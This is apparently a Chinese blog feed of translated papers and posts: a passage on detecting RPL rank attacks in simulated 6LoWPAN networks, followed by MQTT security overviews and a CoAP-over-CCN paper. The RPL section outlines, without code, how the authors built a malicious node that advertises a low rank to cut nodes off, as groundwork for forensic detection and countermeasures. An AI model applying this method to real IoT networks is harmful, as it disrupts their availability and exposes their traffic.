DODAG信息索引（DIS）消息是探针，DODAG信息对象（DIO）消息表明DODAG的存在，并用于形成“向上”路径。最后目的地广告对象（DAO）消息用于构建向下的路径。DAO消息的发送者可以可选地请求确认（DAO-ACK）。 DODAG的形成和维护基于一系列标准，例如DODAG版本，节点的rank和链接度量。被认为具有较低rank的节点比具有较高rank的节点更接近于根。因此，整个DODAG的最小rank对应于其根。链接度量由目标函数（OFs）确定，它们不被定义为RPL规范的一部分。OF也用于计算节点rank。 攻击者发送等级攻击攻击的基本原理如图1所示。攻击者发送的恶意RPL DIO消息广告低rank。这些DIO引导受到攻击的节点，相信恶意节点可以向DODAG根提供更好的路径，并将其选为其父级。因此，受损节点及其树中的所有子节点都会失去与网络其他部分的连接。如果没有适当的保护机制，例如应用层流量的加密，同样的攻击也会危及数据的机密性和完整性。 用例和流量捕获实现 为了进行调查，我们用Cooja模拟器模拟了一个6LoWPAN，它是Contiki OS的一部分。 Cooja模拟IEEE 802.15.4网络，并包括一个可将所有网络流量导出为标准数据包捕获文件（PCAP）的插件，适用于Wireshark和类似工具的处理和分析。然而，假设捕获所有网络流量在实际部署中是可行的，这是不正常的。因此，在模拟网络内部，我们定位在其附近捕获流量的网络嗅探器。我们随后将捕获的PCAP文件合并并使用它们进行分析。为了确认合并的PCAP文件的有效性，我们将其与Cooja导出的文件进行了比较，并验证了合并捕获是整个网络流量的一个子集。换句话说，我们验证合并不会引入任何错误的流量，合并的PCAP文件中的所有帧也会在Cooja导出的一个中遇到。 示例网络设置如图2所示，节点1为DODAG根，节点2为攻击者，节点4和24-27为被动嗅探器，其余为正常RPL节点。 要使用Contiki实现攻击，我们将用作DODAG根节点或RPL路由器节点的标准代码作为起点，并进行以下更改： （1）我们抑制DIS消息。这样可以防止恶意节点对现有网络进行探测。这不是严格要求的。 （2）我们正常收听DIO消息。在这样做时，恶意节点保留了网络当前DODAG版本[4]的记录，如根节点和其他节点所通告的。 攻击者随后有两个选择：它可以作为普通节点加入网络，也可以模拟边界路由器。在前一种情况下，攻击者将表现得像一个普通的节点，但是它会假装通过广告一个非常低的rank为DODAG根提供一个很好的路径。在后一种情况下，它会忽略DIO消息，因此不会加入现有网络。 攻击者然后进行正常的操作，以与合法节点完全相同的方式，将与现有部署使用的参数相同的网络广告。 攻击如图3所示，节点2，攻击节点8,20和22使总共6个节点从网络中分离出来，图3b中显示了受损网络拓扑。 rank利用攻击的成功取决于节点发布的rank以及节点之间的路径度量。考虑图3中的节点2,11和20。为了使节点2对节点20的攻击起作用，节点2的rank加上节点20和节点2之间的路径开销必须低于节点11的rank加上节点20和节点11之间的路径开销。如果是这种情况，则导致节点20相信节点2为DODAG根提供更好的路径并选择它作为其新的父节点。通过节点20的所有流量都转发到节点2，这构成了可用性违规。此外，如果应用层流量未被加密，那么也可能存在机密性和完整性违规，这取决于节点2的行为。 流量分析与事件检测 攻击后事件检测和分析在确定问题的根本原因和涉及攻击的各种事件和实体方面发挥重要作用。确定问题对于提高网络安全性和识别现有的网络漏洞很有用。攻击之后，我们被提供了一个包捕获，包括在事件发生之前，之中和之后的网络流量。研究者可以获得的信息是发生了一个事件，受损节点的标识符（在我们的例子中是IPv6地址）和受损的性质（在我们的情况下，所涉及的节点突然变得无法通过网络）。调查人员旨在确定导致事件的确切步骤。 例如，假设节点X在时间T0之前可达，然后在时间T1之后的某个点处它变得不可达。我们在时间T0和T1之间寻找可能会影响X的连接性的可疑活动。例如，我们观察到节点X正在向节点Y发送DAO消息，直到时间T0。在T 0和T1之间的某个时刻，节点X停止向Y发送DAO，并开始向恶意节点（M）发送DAO。M在T0之前的捕获中不可见，但它出现在T0和T1之间。这可能是正常网络活动的一部分，其中M将是最近加入网络的节点，或者它可能是恶意活动的标志。 为了检测并确认恶意节点的存在，我们需要结合时间元素的行为分析。下面我们提供检测网络异常的算法： （1）我们扫描DAO消息的数据包捕获。 DAO消息由节点发送给其父节点以通知他们自己的存在，并向他们的DODAG孩子通告“下行”的路径。由于捕获提供有关事件发生前的网络状态的信息，因此我们知道节点父子关系。可以通过检查DAO消息的源和目的地来检测父子节点或网络拓扑中的任何变化。 （2）网络拓扑的变化通常由DIO消息触发，DIO消息由节点周期性地发送，并且通常具有链路本地广播IPv6目的地，因此在链路层被广播帧传输。节点侦听DIO并使用其中的信息来选择最小化DODAG根路径的成本的父节点。在上一步中提到的事件之后，我们寻找可能由恶意节点发送的DIO消息。但是，网络拓扑变化是真实的，并且它们没有恶意的可能性。通过以下两个步骤进一步证实恶意活动的存在。 （3）由于丢失的节点选择了一个新的父节点，它可能会降低其rank。节点rank在RPL消息中通告，并且很容易从捕获中提取出来。任何突然的，显着的rank减少可能意味着受损节点选择了恶意的父类。 （4）如前所述，恶意节点本身可以作为普通节点，也可能不利于边界路由器。在后一种情况下，它不会发送DIS和DAO消息。也可以通过检查数据包捕获来检索该信息。 （5）在所有父节点更改事件中，我们记录了父IPv6地址和与这个节点相关的父交换机的数量。基于恶意节点不会从一开始就存在网络中的假设，我们搜索由这些IPv6地址发送的DIO，这些IPv6地址的广告rank非常低，并且在包含在捕获中的早期窗口中不存在。 （6）存在于网络中的节点通常将在任一方向上发送或转发应用层流量。如果应用层流量在时间T0和T1之间存在于网络中，则数据包捕获可以显示该流量下降的位置。 （7）如果多个节点在大致相同的时间点变得无响应，我们可以将导致事故的事件联系起来。例如，如果多个节点在切换到同一个新父母后变得不响应，这会增加这个父母恶意行为的可能性。 实现和评估 我们使用内部开发的工具实现流量捕获，并使用mergecap进行合并，并将其作为Wireshark的一部分进行分发。随后，为了从合并捕获中提取感兴趣的事件并检测恶意节点的存在，我们扩展了开源Foren6工具包[18] 3。 Foren6解析PCAP文件，并将关于捕获的数据报的信息存储在非常详细的数据结构中。一旦PCAP文件加载完成，我们将仔细检查所有捕获的数据报，我们使用Foren6内部数据表示来提取DIS，DIO和DAO消息中包含的信息，以检测感兴趣的事件并生成报告。相同的数据结构也有助于我们记录应用层流量的路径。进一步过滤Foren6分析的数据包，以确保我们没有重复。 当我们遇到任何表示父节点更改的消息时，我们将根据前面讨论的算法来提取其源和目标IPv6地址，并验证其是否是先前消息的结果。工具输出的一个片段如图4所示。观察到最后一行对应于在捕获开始很长时间之后首先开始发送DIO消息的节点i），以及ii）发布非常低的rank。第二列列出了选择节点作为其父节点的设备总数。如图5所示第二个代码段显示了rank减少和单个节点的父更改。 通过进行流量分析，我们可以确定潜在的兴趣事件并将其提交给取证调查员。该工具输出以下信息： （1）所有节点，其父节点和每个父变化的时间戳都按时间戳排序。 （2）父变更涉及的所有节点的rank减少的细节。 （3）网络中所有节点的列表，以及它们是否是DIS，DIO或DAO消息的源。 （4）在父节点切换事件期间充当新父节点的所有节点的列表，以及选择它们作为父节点的节点计数，其第一个传出DIO的时间戳和其中通告的rank。 （5）由作为父母的节点广告的ranks。 通过以可读的的形式呈现这些信息，并通过标识感兴趣的事件，研究者可以以更有效率的方式将他/她的领域专业知识应用于更少平凡的任务。 评估 为了评估我们工作的有效性，我们在网络中运行了两个实验，包括1个合法的边界路由器，20个正常节点，一个攻击者和一个嗅探器。在第一个实验中，攻击者模拟了一个替代的边界路由器，而在第二个实例中，它作为普通节点。对于这个试点评估，我们定位了嗅探器，以捕获所有的网络流量。测试我们的部分流量捕获的机制是我们未来工作的一部分。 对于第一个实验，恶意主机不发送DAO消息。根据我们工具的输出，基于上一小节中的编号1）和4）的信息，识别恶意节点是简单的。 在第二个实验中，恶意节点作为正常路由器，检测更加复杂。在这种情况下，它在各方面都作为一个合法节点运行，发送DAO消息并且通常以隐身方式运行。基于其他节点的突发连接丢失事件来实现检测，突发rank降低，DIO广告rank很低，丢失应用层流量。 图6示出了使用我们的工具进行分析的速度，随着PCAP捕获大小的增加。这些数字是在标准台式电脑上获得的。X轴对应于PCAP中的数据报数量，Y轴显示分析的总持续时间（以秒为单位）。所显示的值包括Foren6解析PCAP所需的时间，以及我们的扩展分析流量，检测感兴趣的事件和生成报告所花费的时间。 对策 版本和rank利用攻击可以通过以下对策来解决： （1）启用DAO-ACK消息。DAO-ACK消息由DAO收件人发送来响应单播DAO。启用DAO-ACK消息将有助于识别恶意活动，也可以用作入侵检测系统的一部分。 （2）白名单的合法IPv6地址，由每个网络节点维护，以避免与恶意节点的通信。这种方法有几个缺点，主要是与这些网络潜在的高流失率有关，这将使得这种白名单的完整性难以维持。此外，这种方法在包含大量节点的网络不能很好地扩展[10]。 （3）启用RPL的身份验证模式，由此节点需要在作为（非路由）主机加入网络之前对其进行身份验证。为了作为路由器加入，节点必须从密钥管理机构获取第二个密钥。这种安全操作模式在RPL规范[4]中简要讨论。然而，根据相同的文档，认证模式不能用对称密钥实现，“RPL只支持对称算法：为了潜在的未来加密原语而被包含认证模式”。 总结与未来的工作 在这项工作中，我们提出了一个流量分析工具，可以识别6LoWPAN中的RPL攻击，标志感兴趣的事件，并将其分析结果以可读的格式呈现给调查员。作为我们未来工作的一部分，我们旨在提高算法的准确性。此外，我们计划进行进一步的实验，以便在流量捕获提供降低的网络覆盖时调查我们的方法的准确性。这个任务的一部分将是尝试根据不完整的信息重建网络拓扑。 这项工作是对这些网络中使用的设备的RAM提取和雕刻工具的补充[21]。通过结合对网络活动的分析和对网络节点的RAM内容的分析，我们可以揭示导致安全事件的事件的有用信息。作为我们未来工作的一部分，我们计划将这两个工作集成到一个单一的工具包中。]]></content>
      <categories>
        <category>论文研读</category>
      </categories>
      <tags>
        <tag>RPL</tag>
        <tag>6LoWPAN Forensics</tag>
        <tag>WSN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]MQTT的安全机制总结]]></title>
    <url>%2F2017%2F08%2F25%2F%E8%AF%91-MQTT%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[HiveMQ团队对MQTT安全方面的系列总结文章写得很不错，所以想要将其翻译整理一下。 HiveMQ 是一个企业级的 MQTT 代理，主要用于企业和新兴的机器到机器M2M通讯和内部传输，最大程度的满足可伸缩性、易管理和安全特性。提供免费的个人版。HiveMQ 提供了开源的插件开发包。 注：本文翻译自：MQTT Security Fundamentals Wrap-Up 在我们的超连接世界中，安全是一个非常重要的方面，从每个IoT应用程序的开始就应该考虑安全性。我们的MQTT安全基础系列的目标是讨论通过MQTT协议保护数据交换的几个概念。 对于没有跟随整个系列的每个人来说，这里是所有按顺序排列的文章： Introducing the MQTT Security Fundamentals Authentication with Username and Password Advanced Authentication Mechanisms Authorization TLS / SSL X509 Client Certificate Authentication OAuth 2.0 &amp; MQTT MQTT Payload Encryption MQTT Message Data Integrity Securing MQTT Systems 文章翻译目录： [译]MQTT安全基础知识介绍 [译]MQTT安全基础：使用用户名和密码进行身份验证 [译]MQTT安全基础：高级认证机制 [译]MQTT安全基础：授权 [译]MQTT安全基础：TLS / SSL [译]MQTT安全基础：X509客户端证书认证 [译]MQTT安全基础：OAuth 2.0和MQTT [译]MQTT安全基础：MQTT有效载荷加密 [译]MQTT安全基础 - MQTT消息数据完整性 [译]MQTT安全基础 - 保护MQTT系统 感谢并关注更多MQTT相关内容， HiveMQ团队]]></content>
      <categories>
        <category>IoT</category>
        <category>MQTT</category>
      </categories>
      <tags>
        <tag>MQTT</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]MQTT安全基础：使用用户名和密码进行身份验证]]></title>
    <url>%2F2017%2F08%2F24%2F%E8%AF%91-MQTT%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%EF%BC%9A%E4%BD%BF%E7%94%A8%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E8%BF%9B%E8%A1%8C%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%2F</url>
    <content type="text"><![CDATA[在上一篇文章中，我们介绍了MQTT中非常基本的安全。今天的文章将从MQTT中的认证开始，进一步详细介绍。 注：本文翻译自：MQTT Security Fundamentals: Authentication with Username and Password 认证是MQTT中传输层和应用层安全性的一部分。 在传输层上，TLS可以保证使用客户端证书的客户端到服务器的身份验证，并确保服务器向客户端验证服务器证书。在应用层上，MQTT协议提供用户名和密码用于验证。各种代理实现在上面添加了不同的机制。本文将概述一般认证，哪些功能内置于MQTT协议本身。下周我们将看看经纪人认证方式。 认证1认证是确认单个数据或实体的属性的真实性的行为。 据维基百科 这意味着认证用于验证个人、设备或应用程序是否具有他们声称拥有的身份。 呈现一个旅行中的简单例子给你。在你能够乘坐飞机之前，机场安检要求你的护照或身份证件。显示所请求的ID以认证身份。在这种情况下，您的护照证实您的身份和您的姓名。每个人都可以说出你的名字，但是只有你能够出示护照作为你身份的证明。 身份验证是我们每天使用的过程，甚至没有注意到。每次登录到您的计算机时，您提供用户名和密码。用户名是您的身份，密码输入会将您认证为合法拥有者。 MQTT认证用户名/密码 当涉及MQTT中的认证时，协议本身在CONNECT消息中提供用户名和密码字段。因此，客户端可以在连接到MQTT代理时发送用户名和密码（有关详细信息，请参阅MQTT Essential Part 3：建立MQTT连接） 用户名是一个UTF-8编码的字符串，密码是二进制数据，最大为65535个字节。在去年发布的新版3.1.1版本中，MQTT 3.1规范中密码为12个字符的非规范性建议被删除。该规范还指出，没有密码的用户名是可能的。只发送密码而没有用户名是不可以的。 当使用内置的用户名/密码认证时，MQTT代理将根据实现的认证机制（更多的是在下一篇文章中）来评估凭证，并返回以下返回码之一（所有返回码的完整列表可以在MQTT Essential Part 3：建立MQTT连接中找到）。 Return Code Return Code Response 0 Connection Accepted 4 Connection Refused, bad user name or password 5 Connection Refused, not authorized 在客户端设置用户名和密码时，将以明文形式发送给代理。这将允许攻击者窃听，并且是获取凭据的简单方式。确保用户名和密码完全安全传输的唯一方法是使用传输加密。 所以这是关于MQTT认证的第一部分，在下一篇文章中，我们将通过验证提供的用户名/密码是否有效或通过使用其他属性（如客户端标识符进行身份验证）来查看在代理端实现身份验证的不同选项。]]></content>
      <categories>
        <category>IoT</category>
        <category>MQTT</category>
      </categories>
      <tags>
        <tag>MQTT</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]MQTT安全基础知识介绍]]></title>
    <url>%2F2017%2F08%2F23%2F%E8%AF%91-MQTT%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[最近我们做了一个问卷调查，询问你认为我们应该在下面讨论的最重要的MQTT主题。如上周的文章中已经提到的，赢家是保护MQTT。所以今天我们将启动一个名为MQTT Security Fundamentals的新系列。我们希望您能像我们每周一样发现MQTT Security的新一部分一样兴奋。这个第一篇文章将作为即将到来的第一篇文章将更加普遍和介绍，这将进一步深入了解MQTT中不同安全领域的不足之处。好的，让我们开始吧。 注：本文翻译自：Introducing the MQTT Security Fundamentals 为什么物联网至关重要？ 在我们的数字和全球化世界中，安全性每天都很突出，如果您正在进行银行转账，网上购物或通过互联网访问个人资料，这并不重要。物联网的想法是连接每个对象，以使过程更有效率，以任何方式提供更多的舒适性或改善我们的工作和个人生活。但连接对象，如汽车，家庭，机器也暴露了许多敏感数据。例如家庭中所有人的位置。也许很高兴知道你的家庭成员是什么，但是与窃贼分享这些信息并不理想。有不同种类的数据，不适用于公众，应受到信息安全支柱的保护：机密性，完整性和可用性。还有另一个需要，当真实的机器或事物受到威胁时，攻击者可以对真实的人造成伤害。喜欢在驾驶或破坏机器时在车内远程启动休息。即使没有真正的人参与，因为我们都知道敏感数据的曝光可能会损害公司的声誉。所以随着越来越多的数据被收集，每天都有更多的设备在我们的生活中安全是一个至关重要的，比以往更重要的话题。 物联网中的安全挑战 对于安全是否应该实施应该是毫无疑问的，但是物联网却给安全带来了新的挑战。虽然安全性通常在高度安全和极好的可用性之间取得平衡，但它在物联网中更加有趣。IoT设备通常受计算能力和内存容量的限制。因此，使用加密算法是一项挑战，通常需要比微型设备更多的资源。另一个挑战是更新现场设备。通常只有不可靠的连接可用，并且安全关键的事情需要立即更新，这可能难以立即向所有设备推出。另外，为用户提供直观的安全的挑战比以往更为重要，因为用户的接受取决于易于安装和维护。尽管从一开始开发IoT应用程序时，安全性就应始终存在。 MQTT中的安全方法 所以在提供了一些上下文之后，我们来看看MQTT如何处理安全性。如果您想首先清理您的MQTT知识，请确保在阅读之前阅读 MQTT Essentials，我们将假设您已经知道协议的概念。 MQTT中的安全分为多层。每层防止不同类型的攻击。该协议的目标是为物联网提供一个非常轻便和易于使用的通信协议。所以这就是为什么在协议本身只有一些安全机制被明确规定。但是在所有常见的实现中，使用其他最先进的安全标准，如用于传输安全性的SSL/TLS。背后的想法是安全性很难，嵌入非标准安全机制并没有好处，而是建立在普遍接受的标准之上。所以在下面的不同层上只会简单地介绍一下，我们将为这个系列中的每一个指派职位。这只能作为高层次的概述和大局。 网络层 使用物理安全网络或VPN作为客户端和代理之间的任何通信的基础，是提供安全可信的连接的一种方式。这适用于网关应用，网关一方面连接到设备，另一方面通过VPN连接到代理。 传输层 当目标是在大多数情况下提供机密性，TLS/SSL被用于传输加密。当使用客户端证书认证时，它提供了一种安全可靠的方法，以确保没有人可以解读，甚至认证双方。我们还将详细介绍TLS在受限设备上的可行性。 应用层 在传输级别上，可以确保通信被加密，并且身份被认证。MQTT协议提供客户端标识符和用户名/密码凭据，也可用于在应用层对设备进行身份验证。这些属性由协议本身提供。当涉及授权或每个设备被允许做什么的时候，它代表了代理实现，如何处理它。另一种可能性是在应用层上使用有效负载加密，以便即使没有完全成熟的传输加密，也能使传输的信息安全。 系列的范围 所以这已经是一个很简单的概述，我们将在接下来的10个星期内讨论什么。我们的目标是讨论MQTT中的所有主要安全支柱和最佳实践。我们没有希望在同一个细节层面上涵盖所有主题。但要专注于最常用的并显示实用的例子。另一个主题将是对MQTT解决方案的潜在攻击以及如何从一开始就防止这些问题。如前所述，我们还将介绍如何使可用的安全机制适应受约束的设备。MQTT提供了很多选项，使其完全安全，但仍然没有高招，安全性要求往往取决于用例。]]></content>
      <categories>
        <category>IoT</category>
        <category>MQTT</category>
      </categories>
      <tags>
        <tag>MQTT</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]CoAP for Content-Centric Networks]]></title>
    <url>%2F2017%2F08%2F20%2F%E8%AF%91-CoAP-for-Content-Centric-Networks%2F</url>
    <content type="text"><![CDATA[CoAP for Content-Centric Networks（全文翻译） 12345Sridhar Srinivasa Subramanian, Joseph Pasquale, George C. Polyzos*Department of Computer Science and EngineeringUniversity of California, San DiegoLa Jolla, CA 92093-0404Email: sridhars@eng.ucsd.edu, pasquale@cs.ucsd.edu, polyzos@cs.ucsd.edu 摘要：我们分析在内容中心网络（CCN）中实现约束应用协议（CoAP）的设计空间，定义了几个CoAP特定场景，并看看它们如何映射到CCN。我们提出一个评估，实施和扩展的建议，以及未来工作的方向。我们的关键结果是，虽然几个协议特征和流程自然地映射，但是在没有对CCN模型进行修改或添加的情况下一些通信模式很难捕获。除了许多概念和非性能相关优势之外，我们的实验性评估表明，通过CCN实现CoAP具有类似于IP over IP的CoAP的性能，并且在某些情况下显着优于其它情况，这是可行和有用的。 引言 随着物联网（IoT）的广泛应用，估计到2020年底将有约260亿台设备满足广泛的应用。传统互联网协议可能不直接适用于IoT设备预期处理的约束环境，特别是考虑到这些设备的资源限制。 IoT网络通常包含大量低端，资源受限的设备，通常配备有限的计算能力，并且需要在长时间的时间内对电池供电进行操作。由于功率限制，IoT网络通常采用低能量二层技术，如IEEE 802.15.4，蓝牙LE和低功耗Wi-Fi，通常以比传统的（例如，以太网）链路更小的MTU大小和更低的传输速率工作。为了节省能源，IoT节点可能不总是像有线网络一样打开。此外，IoT系统可能会部署在没有有线网络基础设施（例如，森林，水下）的环境中，因此必须依靠无线网状技术进行通信。为了解决这些问题，已经提出了几种关于物联网环境的新协议。两个更流行的消息协议是约束应用协议（CoAP）和消息队列遥测传输（MQTT）。CoAP正在越来越受到人们的重视，所以我们的重点是CoAP。 IoT需要支持具有不同应用需求的异构和潜在移动流量。物联网应用也固有地倾向于以信息为中心（例如，数据消费者通常需要从环境中感知到的数据，而无需提供将提供所请求信息的子集）。这导致了以内容为中心的网络（CCN）是否适合于物联网环境的问题。关于物联网基于CCN的方法的可行性和挑战的先前工作已经显示出有希望的结果。我们认为，CCN通过缩小应用程序和网络语义之间的差距，可能在物联网环境中提供广泛的优势。然而，考虑到受限制和低功耗设备，需要重新考虑几个CCN方面。随着CoAP得到广泛接受，我们认为值得探讨的是如何将该协议映射到CCN堆栈。鉴于CoAP使用应用程序级URI来识别资源，CoAP和CCN似乎很好地匹配。 本文的其余部分组织如下：在第二部分中，我们简要讨论了CoAP和CCN的背景，然后激发了CCN在物联网环境中可能提供的潜在优势。在第三部分中，我们将探讨将CoAP映射到CCN堆栈的设计空间。在第四节中，我们讨论了Contiki Cooja环境中的实施和评估。在第五节中，我们讨论一些其他问题，并在第六章中提出结论。 背景和动机 CoAP是为受限制的设备开发的表征性状态转移风格（RESTful）协议，允许通过Internet在客户端和服务器之间进行交互。在受限制设备的环境中，CoAP可用于资源的操纵，例如传感器测量或执行器状态。仅依靠简化的传输，CoAP默认使用UDP作为传输协议。由于UDP不实现端到端可靠性CoAP提供可选的应用层端到端确认（ACK）。通过在输出的CoAP消息中设置可确认（CON）标志，从目的地节点请求端到端ACK。如果在重传超时（RTO）间隔内没有接收到ACK，则为未完成的事务启动重传。与HTTP类似，它支持具有URI的请求，例如GET，PUT，POST，DELETE等，可用于获取，管理和激活IoT资源。CoAP还支持Observe原语，以便监视资源状态，而无需每次轮询。 CCN是基于命名数据概念的通信架构，其中内容的识别和传输依赖于其名称而不是其位置。与今天的基于IP的面向主机的互联网架构相反，CCN通过使内容直接可寻址和可路由来强调内容。端点根据命名数据而不是IP地址进行通信。 CCN的特征在于内容请求消息（称为兴趣）和内容返回消息（称为内容对象，或简单数据）的基本交换。 采用CCN作为物联网的好处众多： 支持有效的群组通信（组播和通用多点通信）：CCN自然支持群组通信。 无需基础设施的通信：与IP网络不同，CCN不需要基础架构。这在紧急情况和灾难情况下尤其有价值。通常，它也更经济。 改进的移动性支持：移动性在CCN中更容易实现，因为我们不再通过IP地址进行路由，这可能会在移动场景中发生变化。 省电：普遍缓存（从而降低带宽需求，高效重传，并且可以有效改善受限设备的能耗）。 支持应用层预处理和数据聚合（在中间节点）：命名功能网络[8]，这是CCN的扩展，概念上与主动网络相似，也引起了很大的兴趣。 易于构建和配置应用程序：消除不必要的中间件需求，特别是与CCN很好匹配的应用程序和应用程序协议，例如具有发布-订阅模型的CoAP。 细粒度的安全性和访问控制：CCN允许用户定义更细粒度的基于名称的安全性和访问控制规则。它也保护数据，而不是保护通道。 COAP OVER CCN 在本节中，我们讨论如何将CoAP中的原语映射到CCN。CoAP中可用的原语包括：CRUD原语（GET，PUT，POST，DELETE），组通信，资源观察和发现。 当映射到CCN（按需内容分发与发布/订阅）时，上述每个都是一种根本不同的通信形式。具体来说，它们的不同在于谁发起了内容流量（基于拉式和基于推式）以及内容在不同时期的有效性方面。例如，CoAP GET可以通过使用CoAP资源URI作为消费者根据需要发送兴趣数据包的内容名称直接映射到CCN。发布的内容也可以机会地缓存。表I显示了这些原语的通信模式的差异。 在CCN中，数据传输是基于拉的，即数据客户端通过兴趣分组请求数据。兴趣只能消耗一个数据项（反之亦然）。然而，在诸如IoT启动，组通信等场景中，最好寻求基于推的解决方案。 CoAP GET GET方法检索当前对应于由请求URI标识的资源的信息的表示。应用程序级资源URI可以自然映射到CCN内容名称。 CoAP GET也遵循基于拉式语义的CCN。一个Interest对应于一个CoAP GET请求，并且一个响应可以作为数据分组获得。 IP堆栈中的CoAP GET支持两种形式的响应。一个是捎带的响应，其中响应直接在确认消息中进行。但是，不可能在所有情况下都返回捎带的响应。 例如，服务器可能需要更多的时间才能获得所请求的资源的表示，而不用等待发回确认消息，而不会使客户端重复发送请求消息。 在CoAP GET的CCN实现中，如果缓存副本在任何相邻节点（在相反路径上）可用，则可以从网络获得响应。如果数据不可用，CoAP可以使用兴趣消息来触发数据生成，并用适当的响应代码对数据包进行响应。流程如图1所示。 CoAP POST, PUT and DELETE POST方法请求处理请求中包含的表示。PUT方法请求由请求URI标识的资源使用附带的表示进行更新或创建。DELETE方法请求删除由请求URI标识的资源。这些请求与CoAP GET请求本质不同，因为它们需要将数据推入服务器，违反了CCNs的通信模式。为了支持这一点，变通方法是必要的。这可以通过使用 long-lived interests，利用interest来触发interest和interest Overloading来实现。 long-lived interests： long-lived interests在[11]中讨论。在这里，资源的提供者发出long-lived interests，表示有兴趣接收该特定资源的PUT，POST和DELETE消息。 支持long-lived interests的一种方式是发行不像正常interest那样过期的interest，想要发送PUT，POST和DELETE消息的消费者发送通知作为对这些interest的回应。由于通知不会清除PIT条目，资源提供商可以继续接收消息。 long-lived interests的主要优点之一是，PIT条目已经在网络中建立，因此内容可以低延迟传输。 关于缺点，应该在要接收数据包的所有节点上建立待定的兴趣。这意味着我们必须在网络中保持大量的状态。另一个缺点是，新的网络元件将难以发现突出的兴趣，并且不断需要刷新PIT条目。 Interest Trigger：使用interest去触发另一个interest已经在[11]中讨论过。当节点想要发送PUT/POST/DELETE请求时，它发出一个interest，并且服务器用虚拟data包进行响应。现在服务器知道有一个节点有兴趣发送一个请求，它发送另一个interest来获取PUT/POST/DELETE请求。流程如图2所示。 这种方法的优点在于，与long-lived interests不同，Interest Trigger不需要在网络中维持持续状态。另外，由于有效载荷是作为data传输的，因此更容易传输安全的内容对象。缺点是这种方法导致额外的延迟，因为额外的兴趣-数据交换。 Interest Overloading：这种方法建议增加兴趣的有效载荷。这种方法背后的理由是发送interest可以被认为是推动数据的一种形式。在CCN中，interest不能携带有效载荷。但是，对于名称的大小没有限制。利用这一点，在兴趣重载中，我们用数据后缀兴趣名称，并且服务器可以通过发送数据分组作为确认来确认兴趣。（回想一下，interest转发是基于名称前缀，因此后缀对路由没有影响。） 这里的优势也在于不需要维护持续的网络状态。此外，它可以支持而不修改CCN。在某些方面，这允许我们模仿推送数据包的IP风格，同时保留CCN核心对其他类型消息的好处。缺点是interest洪泛现在更昂贵（尽管这可以通过良好的路由协议来缓解）。此外，发送安全对象现在更加困难。支持interest包中的有效载荷可以提供非常需要的表现力。 组通信 受限设备的数量可能很大，但是在功能或位置上通常会相互关联。例如，建筑物中的所有灯开关可以属于一组，并且所有恒温器可以属于另一组。组可以是预先配置的，例如在部署之前或在操作期间动态地形成。如果信息需要发送到一组设备或从一组设备接收，组通信原语可以降低通信的延迟和给定应用的带宽要求。 CoAP组通信是RFC 7390中提出的可选扩展，提出了一种基于IP组播的方法来向组成员传递消息。用于低功耗和有损网络（MPL）的组播协议是低功率有损网络中的组播的当前标准。IP网络中的组播一般不被广泛采用。CoAP建议使用资源查询来发现和处理多播地址分配。 另一方面，专为内容传播而设计的CCN拥有本地优雅的群组通信支持。可以利用分层名称空间创建细粒度的组，这有助于基于前缀的高效路由。CCN简化了额外的行政负担。例如，加入一个组就像发送一个消息一样简单，并且在许多方面完全消除了资源目录的需求。 CCN中的群组通信可以由发送long-lived interests的群组成员实现，所有消息都可以作为通知发送。需要进一步的研究在这个方向，因为绕过PIT条目的通知可能会导致网络拥塞。 CoAP观察 为了避免由于轮询资源而导致的额外开销成本，CoAP允许客户端观察资源，即服务器更新客户端。 CCN中可以使用CCN中的通知消息来支持这一点，以便不断向感兴趣的客户端发送更新。这种机制使我们无缝地将其扩展到组观察，整个组可以观察到特定的资源。这可以利用CCN的固有组通信能力，并显着简化了应用层。例如，一个有趣的应用将是观察特定传感器的所有紧急报警。 资源发现 CoAP资源发现使客户端能够发现CoAP服务器可以提供的资源[7]。这允许客户端确定CoAP服务器支持哪些URI及其含义。在IP网络中，请求是针对特定的服务器;在CCN中，请求是网络。客户可以通过洪泛兴趣来发现资源，服务器通过通知进行响应，以便从多个提供者接收数据。我们还可以实现资源目录以最大程度地减少洪泛。客户端可以向资源目录注册他们想要的资源。通过洪泛的资源发现如图3所示。 实现和评估 我们在Contiki操作系统的现有开源CCNx实现之上添加了CoAP层，使用CCN作为第3层协议。我们已经为MSP430 SkyMote架构编译和测试了它。添加了诸如long-lived interests和通知之类的CCN扩展。表II显示了仿真配置。 在第一个实验中，我们通过CCN设置和测量的多跳延迟在UDP和CoAP上建立了一个等效的CoAP，以便了解所涉及的开销。图4显示了用于实验的非常简单的（用于关注延迟与跳数）多跳拓扑。节点0是汇聚节点，它发送CoAP GET请求，节点1,2,3发布不同的资源，并且从汇聚节点0分别为1,2和3跳。 图5显示了跳数对延迟的影响。CoAP在CCN上的延迟略高于CoAP over UDP的延迟。这可能归因于interest洪泛期间的附加网络负载，这导致链路级退避以及处理CCN的数据结构的附加开销。用于CS查找，PIT添加等更快的算法可以改善这一点。 第二个实验着重于缓存对网络的影响。我们使用基本的香草兴趣泛滥（VIF）[6]启用和不启用内容存储，并测量了在网络中发送的interest和data包的数量。interest包被广播，data包沿着相反的路径返回。如果interest的PIT条目已经存在，则重复的interest包被抑制。在没有内容存储的VIF中，interest的传播导致在PIT条目中具有特定数据项的更多节点，这导致更多的节点获得内容以将其传递给请求者。这导致网络负载大幅增长。当缓存用于后续请求时，这被避免。图6显示了缓存对网络负载的影响。 在第三个实验中，我们调查了多个消费者沿着单个数据项的路径的影响。图7显示了具有来自生产者到消费者的共享路径的具有相同数据的多个消费者的拓扑。随着缓存被禁用，网络负载不会线性增加，因为当消费者数量增加时，上游节点简单地丢弃了重复的兴趣。缓存对网络负载以及延迟有重大影响。这是一个非常常见的使用情况，我们有多个执行器作用于相同的命令（内容）。结果如图8所示。 